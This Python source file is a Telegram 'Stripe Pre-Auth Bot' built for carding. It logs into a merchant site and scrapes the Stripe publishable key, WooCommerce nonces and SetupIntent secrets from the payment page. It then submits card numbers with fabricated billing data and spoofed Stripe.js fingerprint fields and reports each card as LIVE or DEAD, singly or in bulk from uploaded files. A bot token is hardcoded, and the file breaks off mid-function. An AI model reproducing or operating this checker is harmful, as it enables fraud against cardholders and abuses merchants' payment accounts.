import logging
import requests.utils
import re
import json
import datetime
import random
import io
import asyncio
import httpx
from bs4 import BeautifulSoup
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

# --- CONFIGURATION ---
BOT_TOKEN = "7879139068:AAHOUUEha6JC1qvoN0w3pW9Eu0UNs1FvcM4"

# --- Emojis for Bot UI ---
EMOJI_WAVE = "👋"
EMOJI_BOT = "🤖"
EMOJI_GEAR = "⚙️"
EMOJI_ROCKET = "🚀"
EMOJI_CHECK = "✅"
EMOJI_CROSS = "❌"
EMOJI_WARN = "⚠️"
EMOJI_WAIT = "⏳"
EMOJI_CARD = "💳"
EMOJI_BANK = "🏦"
EMOJI_SPARKLE = "✨"
EMOJI_LIGHT = "💡"
EMOJI_STOP = "🛑"
EMOJI_INFO = "ℹ️"
EMOJI_FILE = "📎"
EMOJI_FLAG = "🏁"
EMOJI_SPY = "🕵️"
EMOJI_CLOCK = "⏱️"
EMOJI_CHAIN = "🔗"
EMOJI_KEY = "🔑"
EMOJI_SECRET = "🤫"

# --- State Constants for Conversation Flow ---
STATE_AWAIT_LOGIN = 'awaiting_login_details'
STATE_AWAIT_PAYMENT_URL = 'awaiting_payment_url'
STATE_AWAIT_CHECK = 'awaiting_check'

# --- Logging Setup ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)


# --- HTTP Headers Helper ---
def get_general_headers(target_url=None, referer=None):
    authority = "example.com"
    if target_url:
        try:
            parsed_url = requests.utils.urlparse(target_url)
            authority = parsed_url.netloc if parsed_url.netloc else authority
        except Exception:
            logger.warning(f"Could not parse target_url {target_url} for authority.")

    effective_referer = referer
    if not effective_referer and target_url:
        try:
            parsed_target_url = requests.utils.urlparse(target_url)
            effective_referer = f"{parsed_target_url.scheme}://{parsed_target_url.netloc}/"
        except Exception:
            effective_referer = "https://google.com"
    elif not effective_referer:
        effective_referer = "https://google.com"

    return {
        "authority": authority,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache", "pragma": "no-cache",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin" if referer and authority in referer else "cross-site",
        "sec-fetch-user": "?1", "upgrade-insecure-requests": "1",
        "referer": effective_referer,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }


# --- Safe Message Sending Utility ---
async def send_safe_reply(message_object_or_update, text_to_send, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=None):
    """Safely sends a message, falling back to plain text if Markdown parsing fails."""
    actual_message_obj = None
    if isinstance(message_object_or_update, Update):
        if message_object_or_update.message:
            actual_message_obj = message_object_or_update.message
        elif message_object_or_update.callback_query:
            actual_message_obj = message_object_or_update.callback_query.message
        elif message_object_or_update.edited_message:
            actual_message_obj = message_object_or_update.edited_message
    else:
        actual_message_obj = message_object_or_update

    if not actual_message_obj:
        logger.error(f"send_safe_reply: Could not determine message object from: {type(message_object_or_update)}")
        return None

    try:
        return await actual_message_obj.reply_text(text_to_send, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as md_err:
        logger.warning(f"MarkdownV2 parsing error. Sending as plain. Error: {md_err}")
        try:
            return await actual_message_obj.reply_text(text_to_send, reply_markup=reply_markup)
        except Exception as plain_err:
            logger.error(f"Failed to send even plain text reply. Error: {plain_err}")
            return None


# --- BIN Lookup Utility ---
async def get_bin_info(card_number_first_6_digits: str, client: httpx.AsyncClient):
    """Fetches BIN information from binlist.net."""
    if not card_number_first_6_digits or len(card_number_first_6_digits) < 6:
        return {"error": "Invalid BIN length"}
    try:
        response = await client.get(f"https://lookup.binlist.net/{card_number_first_6_digits}", timeout=10)
        response.raise_for_status()
        data = response.json()
        return {
            "scheme": data.get("scheme", "N/A").upper(),
            "type": data.get("type", "N/A").upper(),
            "brand": data.get("brand", "N/A").upper(),
            "country": data.get("country", {}).get("name", "N/A"),
            "bank": data.get("bank", {}).get("name", "N/A"),
        }
    except httpx.HTTPStatusError as e:
        logger.error(f"BIN lookup HTTP error for {card_number_first_6_digits}: {e} - Response: {e.response.text}")
        error_message = f"HTTP {e.response.status_code}"
        if e.response.status_code == 404: error_message = "BIN Not Found"
        elif e.response.status_code == 429: error_message = "Rate Limited"
        return {"error": error_message}
    except Exception as e:
        logger.error(f"BIN lookup failed for {card_number_first_6_digits}: {e}")
        return {"error": "Lookup Failed"}


# --- Core Logic Functions ---
async def perform_site_login(login_url: str, username: str, password: str, client: httpx.AsyncClient):
    """
    Handles the entire login process for a target website.
    This is a large function kept in its original structure as requested.
    """
    base_url = None
    login_final_url = login_url
    try:
        # --- Parse Base URL ---
        parsed_login_url = requests.utils.urlparse(login_url)
        base_url = f"{parsed_login_url.scheme}://{parsed_login_url.netloc}"

        # --- Fetch Login Page ---
        login_page_response = await client.get(login_url, headers=get_general_headers(target_url=login_url))
        login_final_url = str(login_page_response.url)
        login_page_response.raise_for_status()
        login_page_text = login_page_response.text
        soup = BeautifulSoup(login_page_text, "html.parser")

        # --- Find Security Nonce ---
        nonce = None
        nonce_selectors = [{"name": "woocommerce-login-nonce"}, {"id": "woocommerce-login-nonce"}, {"name": "_wpnonce"}, {"id": "_wpnonce"}, {"name": "csrf_token"}, {"name": "_token"}]
        for selector in nonce_selectors:
            nonce_input = soup.find("input", selector)
            if nonce_input and nonce_input.get("value"): nonce = nonce_input["value"]; break
        if not nonce:
            script_nonce_patterns = [r'["\'](?:woocommerce-login-nonce|_wpnonce|csrf_token|_token)["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', r'name=["\'](?:woocommerce-login-nonce|_wpnonce|csrf_token|_token)["\']\svalue=["\']([a-zA-Z0-9]+)["\']']
            for pattern in script_nonce_patterns:
                script_nonce_match = re.search(pattern, login_page_text)
                if script_nonce_match: nonce = script_nonce_match.group(1); break

        # --- Find Login Form ---
        form_action_url = login_url
        login_form = soup.find("form", {"id": "loginform"}) or \
                     soup.find("form", class_=re.compile(r".*(login|signin|account).*form.*", re.I)) or \
                     soup.find("form", action=re.compile(r".*login.*", re.I))
        if login_form and login_form.get("action"):
            form_action_url = requests.utils.urljoin(login_url, login_form.get("action"))

        # --- Build Login Payload ---
        data = {"redirect_to": login_url, "testcookie": "1"}
        username_fields = ["log", "username", "email", "user_login", "user[email]", "session[email_or_username]"]
        password_fields = ["pwd", "password", "user_password", "user[password]", "session[password]"]

        found_user_field = False
        for u_field in username_fields:
            if soup.find("input", {"name": u_field}): data[u_field] = username; found_user_field = True; break
        if not found_user_field: data["username"] = username

        found_pass_field = False
        for p_field in password_fields:
            if soup.find("input", {"name": p_field}): data[p_field] = password; found_pass_field = True; break
        if not found_pass_field: data["password"] = password

        if nonce:
            nonce_input_field = soup.find("input", {"value": nonce})
            if nonce_input_field and nonce_input_field.get("name"):
                data[nonce_input_field.get("name")] = nonce
            else:
                for n_name in ["woocommerce-login-nonce", "_wpnonce", "csrf_token", "_token", "nonce"]:
                    if soup.find("input", {"name": n_name}): data[n_name] = nonce; break
                else: data["_wpnonce"] = nonce

        submit_buttons = soup.find_all("button", {"type": "submit"}) + soup.find_all("input", {"type": "submit"})
        found_submit_name = False
        for btn in submit_buttons:
            if btn.get("name"): data[btn.get("name")] = btn.get("value", "Log In"); found_submit_name = True; break
        if not found_submit_name: data.setdefault("wp-submit", "Log In")

        # --- Post Login Request ---
        login_response = await client.post(form_action_url, data=data, headers=get_general_headers(target_url=form_action_url, referer=login_url), follow_redirects=True)
        login_final_url = str(login_response.url)
        login_response.raise_for_status()
        login_response_text_lower = login_response.text.lower()

        # --- Verify Login Success ---
        login_successful = False
        logout_keywords = ["logout", "log out", "sign out", "sign-out", "customer/account/logout", "wp-login.php?action=logout"]
        dashboard_keywords = ["dashboard", "my account", "order history", "account details", "your profile"]
        if any(k in login_response_text_lower for k in logout_keywords) or \
           (hasattr(login_response, 'url') and any(k in str(login_response.url).lower() for k in (dashboard_keywords + logout_keywords))) or \
           any(k in login_response_text_lower for k in dashboard_keywords):
            login_successful = True

        error_messages_on_page = ["incorrect username or password", "unknown username", "invalid username", "invalid password", "error:", "the password you entered is incorrect", "authentication failed", "too many failed login attempts", "invalid login credentials", "lost your password?"]
        if login_successful and any(err in login_response_text_lower for err in error_messages_on_page):
            current_page_soup = BeautifulSoup(login_response.text, "html.parser")
            if current_page_soup.find("form", {"id": "loginform"}) or \
               current_page_soup.find("form", class_=re.compile(r".*login.*form.*", re.I)) or \
               any(err in login_response_text_lower for err in ["login failed", "authentication failed"]):
                login_successful = False

        if not login_successful:
            error_soup = BeautifulSoup(login_response.text, "html.parser")
            error_element = error_soup.find(class_=re.compile(r".*(error|alert|message|notice|warning).*", re.I)) or \
                            error_soup.find(id=re.compile(r".*(error|alert|message|notice|warning).*", re.I))
            error_text = "Login failed. Check credentials/URL."
            if error_element:
                error_text_candidate = error_element.get_text(separator=' ', strip=True)
                if error_text_candidate: error_text = error_text_candidate[:200]

            for common_err_phrase in error_messages_on_page:
                if common_err_phrase in login_response_text_lower:
                    if error_text == "Login failed. Check credentials/URL.":
                        error_text = common_err_phrase.capitalize() + "."
                    break
            return base_url, username, login_final_url, error_text

        return base_url, username, login_final_url, None
    except httpx.HTTPStatusError as e:
        error_message = f"HTTP Error: {e.response.status_code}"
        if e.response.text: error_message += f" - Server said: {e.response.text[:100]}..."
        logger.error(f"Login HTTP Error for {username} on {login_url}: {e}")
        return base_url, username, login_final_url, error_message
    except httpx.RequestError as e:
        logger.error(f"Login Network error for {username} on {login_url}: {e}")
        return base_url, username, login_final_url, f"Network error: {str(e)}"
    except Exception as e:
        logger.exception(f"Unexpected error during login for {username} on {login_url}")
        return base_url, username, login_final_url, f"Unexpected login error: {str(e)}"


async def parse_payment_page_details(client: httpx.AsyncClient, payment_page_url: str, base_url: str, current_site_url_for_referer: str):
    """
    Parses a given payment page to extract Stripe-related parameters.
    This is a large function kept in its original structure as requested.
    """
    stripe_params = {'api_type': 'unknown'}
    fetched_payment_page_url = payment_page_url
    try:
        page_response = await client.get(payment_page_url, headers=get_general_headers(target_url=payment_page_url, referer=current_site_url_for_referer))
        fetched_payment_page_url = str(page_response.url)
        page_response.raise_for_status()
        page_content = page_response.text

        # --- Find Stripe PK (Publishable Key) ---
        pk_patterns = [r"Stripe\s*\(\s*['\"](pk_(?:live|test)_[a-zA-Z0-9]+)['\"]\s*\)", r"""['"](pk_(?:live|test)_[a-zA-Z0-9]+)['"]""", r"""\b(pk_(?:live|test)_[a-zA-Z0-9]{20,})\b"""]
        for pattern in pk_patterns:
            match = re.search(pattern, page_content)
            if match: stripe_params['stripe_pk'] = match.group(1); break

        # --- Find WooCommerce AJAX Details ---
        soup_payment_page = BeautifulSoup(page_content, "html.parser")
        wc_script_tag = soup_payment_page.find('script', {'id': re.compile(r'wc-stripe.*js-extra', re.I)})
        if wc_script_tag and wc_script_tag.string:
            nonce_match = re.search(r'"(?:createAndConfirmSetupIntentNonce|stripePaymentRequestNonce|addPaymentMethodNonce)":"([a-zA-Z0-9]+)"', wc_script_tag.string)
            if nonce_match:
                stripe_params['wc_ajax_nonce'] = nonce_match.group(1)
                action_name_match = re.search(r'"(wc_stripe_[a-zA-Z0-9_]+)".*(?:"nonce"|"Nonce")', wc_script_tag.string, re.I)
                wc_action = "wc_stripe_create_and_confirm_setup_intent"
                if action_name_match: wc_action = action_name_match.group(1)
                elif "createAndConfirmSetupIntentNonce" not in wc_script_tag.string: wc_action = "wc_stripe_upe_classic_intent_handler"
                stripe_params['wc_true_ajax_url'] = f"{base_url}/?wc-ajax={wc_action}"
                stripe_params['api_type'] = "setup_intent"

        # --- Find Setup Intent Client Secret ---
        si_secret_pattern = r"""['"]?(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)['"]?"""
        si_match_page = re.search(si_secret_pattern, page_content)
        if si_match_page:
            stripe_params['stripe_client_secret'] = si_match_page.group(1)
            if stripe_params.get('api_type') == 'unknown': stripe_params['api_type'] = "setup_intent"
        else:
            secret_element = soup_payment_page.find(attrs={"data-client-secret": re.compile(r"seti_.*_secret_.*")})
            if secret_element and "seti_" in secret_element.get("data-client-secret", ""):
                stripe_params['stripe_client_secret'] = secret_element["data-client-secret"]
                if stripe_params.get('api_type') == 'unknown': stripe_params['api_type'] = "setup_intent"
            else:
                for script_tag in soup_payment_page.find_all("script"):
                    if script_tag.string:
                        si_script_match = re.search(si_secret_pattern, script_tag.string)
                        if si_script_match:
                            stripe_params['stripe_client_secret'] = si_script_match.group(1)
                            if stripe_params.get('api_type') == 'unknown': stripe_params['api_type'] = "setup_intent"
                            break

        # --- Determine API Type as Fallback ---
        if stripe_params.get('api_type') == 'unknown':
            if stripe_params.get('stripe_pk') and any(js_indicator in page_content.lower() for js_indicator in ["stripe.js", "js.stripe.com/v3", "stripe.elements"]):
                stripe_params['api_type'] = "payment_method"

        stripe_params['fetched_payment_page_url'] = fetched_payment_page_url
        return stripe_params, None

    except httpx.HTTPStatusError as e:
        error_msg = f"HTTP Error {e.response.status_code} fetching payment page"
        logger.error(f"{error_msg} {payment_page_url}: {e}")
        return stripe_params, error_msg
    except httpx.RequestError as e:
        error_msg = f"Network error fetching payment page"
        logger.error(f"{error_msg} {payment_page_url}: {e}")
        return stripe_params, error_msg
    except Exception as e:
        logger.exception(f"Unexpected error parsing payment page {payment_page_url}")
        return stripe_params, f"Unexpected error parsing payment page: {str(e)}"


async def perform_card_check_logic(
    client: httpx.AsyncClient, stripe_params: dict, card_data: dict,
    billing_email: str, payment_page_url_for_referer: str, context: ContextTypes.DEFAULT_TYPE
):
    """
    Performs the full card check, from PM creation to Intent confirmation.
    This is a large function kept in its original structure as requested.
    """
    cc, mm_str, yy_raw, cvv_str = card_data['cc'], card_data['mm'], card_data['yy'], card_data['cvv']
    exp_year_str = f"20{yy_raw}" if len(yy_raw) == 2 else yy_raw

    result = {
        "is_approved": False, "status_summary": "DEAD - Pre-check Failed",
        "status_summary_short": "DEAD", "stripe_message": "Invalid card details",
        "pm_id": None, "intent_id": None, "decline_code": None,
        "raw_pm_response": {}, "raw_intent_response": {}
    }

    # --- Basic Card Validation ---
    try:
        current_year = datetime.date.today().year
        current_month = datetime.date.today().month
        if not (cc.isdigit() and 13 <= len(cc) <= 19 and
                mm_str.isdigit() and 1 <= int(mm_str) <= 12 and
                exp_year_str.isdigit() and len(exp_year_str) == 4 and int(exp_year_str) >= current_year and
                (int(exp_year_str) > current_year or (int(exp_year_str) == current_year and int(mm_str) >= current_month)) and
                cvv_str.isdigit() and 3 <= len(cvv_str) <= 4):
            return result
    except ValueError:
        result["stripe_message"] = "Invalid numeric value in card MM/YY"
        return result

    stripe_pk = stripe_params.get("stripe_pk")
    if not stripe_pk:
        result["stripe_message"] = "Stripe Publishable Key is missing"
        return result

    # --- Create Stripe PaymentMethod (PM) ---
    pm_creation_headers = {
        "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": f"Bearer {stripe_pk}", "User-Agent": get_general_headers()["user-agent"]
    }
    billing_name_parts = billing_email.split('@')[0].split('.')
    billing_first_name = billing_name_parts[0].capitalize() if billing_name_parts else "User"
    billing_last_name = billing_name_parts[1].capitalize() if len(billing_name_parts) > 1 else "Test"
    pm_payload = {
        "type": "card", "card[number]": cc, "card[cvc]": cvv_str,
        "card[exp_month]": mm_str, "card[exp_year]": exp_year_str,
        "billing_details[name]": f"{billing_first_name} {billing_last_name}",
        "billing_details[email]": billing_email,
        "billing_details[address][line1]": "123 Innovation Drive", "billing_details[address][city]": "Techville",
        "billing_details[address][state]": "TS", "billing_details[address][postal_code]": str(random.randint(10000, 99999)),
        "billing_details[address][country]": "US", "guid": "NA", "muid": "NA", "sid": "NA",
        "payment_user_agent": f"stripe.js/{context.bot_data.get('stripe_js_version', 'v3_bot_custom_chk')}_{datetime.datetime.utcnow().timestamp()}",
        "time_on_page": str(context.bot_data.get('time_on_page', random.randint(20000, 45000)))
    }

    try:
        pm_response = await client.post("https://api.stripe.com/v1/payment_methods", headers=pm_creation_headers, data=pm_payload)
        created_pm_json = pm_response.json()
        result["raw_pm_response"] = created_pm_json
    except (httpx.RequestError, json.JSONDecodeError) as e:
        logger.error(f"PM Creation request/JSON error: {e}")
        result["stripe_message"] = f"PM API Error: {str(e)}"
        return result

    if 'error' in created_pm_json or pm_response.status_code >= 400:
        err_info = created_pm_json.get('error', {})
        result["stripe_message"] = err_info.get('message', 'PaymentMethod creation failed with unspecified Stripe error.')
        result["decline_code"] = err_info.get('decline_code')
        result["status_summary"] = f"DEAD - {result['stripe_message']}"
        return result

    result["pm_id"] = created_pm_json.get("id")
    if not result["pm_id"]:
        result["stripe_message"] = "PaymentMethod created but no ID returned by Stripe."
        return result

    result["status_summary"] = f"LIVE - PM Created ({result['pm_id'][:10]}...)"
    result["status_summary_short"] = "LIVE (PM)"

    # *** BUG FIX: Changed "stripe_type" to "api_type" to match key from parsing function ***
    api_type = stripe_params.get("api_type")
    if api_type != "setup_intent":
        result["is_approved"] = True
        result["stripe_message"] = "PaymentMethod created (page not identified as SetupIntent)"
        return result

    # --- Confirm SetupIntent ---
    wc_ajax_nonce = stripe_params.get("wc_ajax_nonce")
    wc_true_ajax_url = stripe_params.get("wc_true_ajax_url")
    stripe_client_secret = stripe_params.get("stripe_client_secret")

    confirmation_method_used = None
    intent_confirmed_successfully = False

    # --- Method 1: WooCommerce AJAX Confirmation ---
    if wc_ajax_nonce and wc_true_ajax_url:
        confirmation_method_used = "WooCommerce AJAX"
        wc_ajax_headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest', 'Referer': payment_page_url_for_referer,
            'User-Agent': get_general_headers()["user-agent"],
            'Origin': requests.utils.urlparse(payment_page_url_for_referer).scheme + "://" + requests.utils.urlparse(payment_page_url_for_referer).netloc
        }
        wc_ajax_payload = {
            'action': requests.utils.urlparse(wc_true_ajax_url).query.split('=')[-1],
            'wc-stripe-payment-method': result["pm_id"], 'wc-stripe-payment-type': 'card',
            '_ajax_nonce': wc_ajax_nonce, 'email': billing_email,
        }
        try:
            intent_response = await client.post(wc_true_ajax_url, data=wc_ajax_payload, headers=wc_ajax_headers, follow_redirects=True)
            wc_result_json = intent_response.json()
            result["raw_intent_response"] = wc_result_json
            if wc_result_json.get('success') is True or \
               (isinstance(wc_result_json.get('data'), dict) and wc_result_json.get('data', {}).get('status') == 'succeeded'):
                intent_confirmed_successfully = True
                result["intent_id"] = wc_result_json.get('data', {}).get('id')
                result["stripe_message"] = f"WC AJAX: {wc_result_json.get('data', {}).get('status', 'succeeded')}"
            else:
                errors = wc_result_json.get('data', [])
                error_msg_wc = "Declined/Error reported by WC AJAX."
                if isinstance(errors, list) and errors and isinstance(errors[0], dict):
                    error_msg_wc = errors[0].get('message', error_msg_wc)
                elif isinstance(errors, str): error_msg_wc = errors
                result["stripe_message"] = f"WC AJAX: {error_msg_wc}"
        except (httpx.RequestError, json.JSONDecodeError) as e:
            logger.error(f"WC AJAX intent confirmation error: {e}")
            result["stripe_message"] = f"WC AJAX Error: {str(e)}"

    # --- Method 2: Direct Stripe API Confirmation (Fallback) ---
    if not intent_confirmed_successfully and stripe_client_secret:
        confirmation_method_used = "Direct Stripe API"
        intent_id_from_secret = stripe_client_secret.split('_secret_')[0]
        direct_confirm_url = f"https://api.stripe.com/v1/setup_intents/{intent_id_from_secret}/confirm"
        direct_confirm_payload = {
            "payment_method": result["pm_id"], "client_secret": stripe_client_secret,
            "return_url": f"{requests.utils.urlparse(payment_page_url_for_referer).scheme}://{requests.utils.urlparse(payment_page_url_for_referer).netloc}/stripe_bot_return?si_id={intent_id_from_secret}"
        }
        direct_confirm_headers = {
            "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": f"Bearer {stripe_pk}", "User-Agent": get_general_headers()["user-agent"]
        }
        try:
            intent_response = await client.post(direct_confirm_url, headers=direct_confirm_headers, data=direct_confirm_payload)
            direct_result_json = intent_response.json()
            result["raw_intent_response"] = direct_result_json
            if 'error' in direct_result_json:
                err = direct_result_json['error']
                result["stripe_message"] = f"Direct API: {err.get('message', 'Unknown Stripe API Error')}"
                result["decline_code"] = err.get('decline_code')
                if err.get('setup_intent'): result["intent_id"] = err.get('setup_intent').get('id')
            else:
                si_status = direct_result_json.get('status')
                result["intent_id"] = direct_result_json.get('id')
                result["stripe_message"] = f"Direct API: {si_status}"
                if si_status == "succeeded":
                    intent_confirmed_successfully = True
                elif si_status == "requires_payment_method":
                    result["decline_code"] = direct_result_json.get('last_setup_error', {}).get('decline_code', result["decline_code"])
        except (httpx.RequestError, json.JSONDecodeError) as e:
            logger.error(f"Direct Stripe API intent confirmation error: {e}")
            result["stripe_message"] = f"Direct API Error: {str(e)}"

    # --- Finalize Result ---
    if intent_confirmed_successfully:
        result["is_approved"] = True
        result["status_summary"] = f"LIVE - Intent Confirmed ({confirmation_method_used or 'Unknown Method'})"
        result["status_summary_short"] = "LIVE"
    elif result["pm_id"]:
        result["status_summary"] = f"DEAD - Intent Failed via {confirmation_method_used or 'N/A'}" if confirmation_method_used else f"DEAD - PM Created, Intent Not Processed/Confirmed"
        result["status_summary_short"] = "DEAD (Intent)"

    return result


# --- Command Handlers ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    welcome_message = (
        f"{EMOJI_WAVE} *Hello, {escape_markdown(user_name, version=2)}\\!*"
        f"\n\nI'm your Stripe Pre\\-Auth Bot {EMOJI_BOT}\\."
        f"\n\nTo begin, you need to set up a website context\\. "
        f"Use the `/addsitelogin` command to get started\\."
        f"\n\n{EMOJI_INFO} For a full list of commands, type `/help`\\."
    )
    context.user_data.clear()
    await send_safe_reply(update.message, welcome_message)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        f"{EMOJI_SPARKLE} *Bot Commands & Info*"
        f"\n\n*Initial Setup Flow:*"
        f"\n*1\\.* `/addsitelogin`"
        f"\n   Starts the process by asking for website credentials in the format:"
        f"\n   `LOGIN_PAGE_URL|EMAIL|PASSWORD`"
        f"\n\n*2\\.* *Provide Payment Page URL*"
        f"\n   After a successful login, the bot will ask for the URL of the 'Add Payment Method' page\\. This is crucial for finding the Stripe keys\\."
        f"\n\n*Card Checking Commands* \\(after setup\\):"
        f"\n*3\\.* `/chk CC|MM|YY|CVV`"
        f"\n   Checks a single card against the configured site\\."
        f"\n   *Example:* `/chk 4012888818888888|12|28|123`"
        f"\n\n*4\\.* `/mchk` \\(as a reply to a \\.txt file\\)"
        f"\n   Checks multiple cards from a text file\\. Each line must be in `CC|MM|YY|CVV` format\\."
        f"\n\n{EMOJI_STOP} *Security Warning* {EMOJI_STOP}"
        f"\nThis bot handles sensitive data\\. Use responsibly and only with data you are authorized to access\\."
    )
    await send_safe_reply(update.message, help_text)


async def addsitelogin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    logger.info(f"User {update.effective_user.id} started /addsitelogin.")
    reply_text = (
        f"{EMOJI_ROCKET} *Site Setup: Step 1 \\- Login*"
        f"\n\nPlease send your website login details in this exact format, separated by `|`:"
        f"\n`LOGIN_PAGE_URL|EMAIL_OR_USERNAME|PASSWORD`"
        f"\n\n*Example*:"
        f"\n`https://mywebshop.com/my-account/|shopper@example.com|SuperSecret123`"
    )
    await send_safe_reply(update.message, reply_text)
    context.user_data['next_action'] = STATE_AWAIT_LOGIN


async def handle_login_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('next_action') != STATE_AWAIT_LOGIN:
        return await route_text_message(update, context, called_from_specific_handler=True)

    if not update.message or not update.message.text or '|' not in update.message.text or update.message.text.count('|') != 2:
        await send_safe_reply(update.message, f"{EMOJI_WARN} *Format Error*\\.\nUse: `LOGIN_PAGE_URL|EMAIL_OR_USERNAME|PASSWORD`\\.\nTry /addsitelogin to restart\\.")
        return

    full_url, login_identifier, pwd = map(str.strip, update.message.text.split('|', 2))
    if not full_url.lower().startswith("http"):
        await send_safe_reply(update.message, f"{EMOJI_WARN} *Invalid URL*\\.\nMust start with `http://` or `https://`\\.")
        return

    status_msg_login = await send_safe_reply(update.message, f"{EMOJI_WAIT} Logging in, please stand by...", parse_mode=None)

    client: httpx.AsyncClient = context.bot_data['http_client']
    base_url, final_login_identifier, login_final_url, error = await perform_site_login(full_url, login_identifier, pwd, client)

    if error or not base_url:
        error_message_user = f"{EMOJI_CROSS} *Login Failed*\n\n`{escape_markdown(error,version=2)}`\n\nDouble\\-check details or use `/addsitelogin` again\\."
        await status_msg_login.edit_text(text=error_message_user, parse_mode=ParseMode.MARKDOWN_V2)
        context.user_data.pop('next_action', None)
        return

    context.user_data['base_url'] = base_url
    context.user_data['login_identifier'] = final_login_identifier
    context.user_data['current_site_url'] = login_final_url

    context.user_data['next_action'] = STATE_AWAIT_PAYMENT_URL
    success_message = (
        f"{EMOJI_CHECK} *Login Successful\\!*"
        f"\n\n{EMOJI_ROCKET} *Site Setup: Step 2 \\- Payment Page*"
        f"\n\nNow, send me the *exact URL* of the page where you add a payment method \\(the page with the Stripe form\\)\\."
        f"\n\n*Example*:\n`https://mywebshop.com/my-account/add-payment-method/`"
    )
    await status_msg_login.edit_text(text=success_message, parse_mode=ParseMode.MARKDOWN_V2)


async def handle_payment_page_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('next_action') != STATE_AWAIT_PAYMENT_URL:
        return await route_text_message(update, context, called_from_specific_handler=True)

    payment_page_url_input = update.message.text.strip()
    if not payment_page_url_input.lower().startswith("http"):
        await send_safe_reply(update.message, f"{EMOJI_WARN} That URL looks invalid\\. It needs to start with `http://` or `https://`\\.")
        return

    client: httpx.AsyncClient = context.bot_data['http_client']
    base_url = context.user_data.get("base_url")
    current_site_url_for_referer = context.user_data.get('current_site_url', payment_page_url_input)

    if not base_url:
        await send_safe_reply(update.message, f"{EMOJI_WARN} Session expired or missing\\! Please restart with `/addsitelogin`\\.")
        context.user_data.pop('next_action', None)
        return

    status_msg_scan = await send_safe_reply(update.message, f"{EMOJI_WAIT} Scanning payment page for Stripe details...", parse_mode=None)

    stripe_params, error = await parse_payment_page_details(client, payment_page_url_input, base_url, current_site_url_for_referer)

    if error:
        error_message_scan = f"{EMOJI_CROSS} *Error Parsing Payment Page*\n`{escape_markdown(error, version=2)}`"
        await status_msg_scan.edit_text(text=error_message_scan, parse_mode=ParseMode.MARKDOWN_V2)
        return

    context.user_data.update(stripe_params)
    context.user_data['payment_page_url_for_chk'] = stripe_params.get('fetched_payment_page_url', payment_page_url_input)

    reply_parts = [f"{EMOJI_CHECK} *Site Context Scan Complete*"]
    pk_text = stripe_params.get('stripe_pk', 'N/A')
    pk_status_text = EMOJI_CHECK if stripe_params.get('stripe_pk') else EMOJI_CROSS
    reply_parts.append(f"\n{EMOJI_KEY} *Stripe PK:* {pk_status_text} `{escape_markdown(pk_text, version=2)}`")
    reply_parts.append(f"{EMOJI_GEAR} *API Type Detected:* `{escape_markdown(str(stripe_params.get('api_type')), version=2)}`")

    if stripe_params.get('stripe_client_secret'):
        secret_preview = stripe_params['stripe_client_secret'][:15] + '...'
        reply_parts.append(f"{EMOJI_SECRET} *Client Secret:* {EMOJI_CHECK} `{escape_markdown(secret_preview, version=2)}`")

    can_proceed_with_card_checks = (stripe_params.get('api_type') != 'unknown' and stripe_params.get('stripe_pk'))

    if can_proceed_with_card_checks:
        reply_parts.append(f"\n{EMOJI_ROCKET} *Ready for Checks\\!*")
        reply_parts.append(f"You can now use `/chk` or `/mchk`\\.")
        context.user_data['next_action'] = STATE_AWAIT_CHECK
    else:
        reply_parts.append(f"\n{EMOJI_WARN} *Cannot Proceed*")
        reply_parts.append(f"A valid Stripe PK and detectable API type are required\\. Please try a different payment page URL or restart with `/addsitelogin`\\.")
        context.user_data['next_action'] = STATE_AWAIT_PAYMENT_URL

    final_scan_message = "\n".join(reply_parts)
    await status_msg_scan.edit_text(text=final_scan_message, parse_mode=ParseMode.MARKDOWN_V2)


async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_details_str = ""
    # Check if context for site is set up
    if context.user_data.get('next_action') != STATE_AWAIT_CHECK:
        await send_safe_reply(update.message, f"{EMOJI_WARN} Site context not set up\\! Please use `/addsitelogin` and provide the payment page URL first\\.")
        return

    if update.message and update.message.text:
        command_text = update.message.text.strip()
        if command_text.lower().startswith("/chk "):
            card_details_str = command_text[len("/chk "):].strip()
        elif '|' in command_text and command_text.count('|') == 3:
            card_details_str = command_text
        else:
            await send_safe_reply(update.message, f"{EMOJI_CARD} Please provide card details after `/chk` or just send `CARD|MM|YY|CVV`\\.")
            return

    if not card_details_str or card_details_str.count('|') != 3:
        await send_safe_reply(update.message, f"{EMOJI_WARN} Invalid card format\\. Please use: `CARD_NUMBER|MM|YY|CVV`\\.")
        return

    try:
        cc, mm_str, yy_raw, cvv_str = map(str.strip, card_details_str.split('|'))
    except ValueError:
        await send_safe_reply(update.message, f"{EMOJI_WARN} Error parsing card details\\. Ensure format is correct\\.")
        return

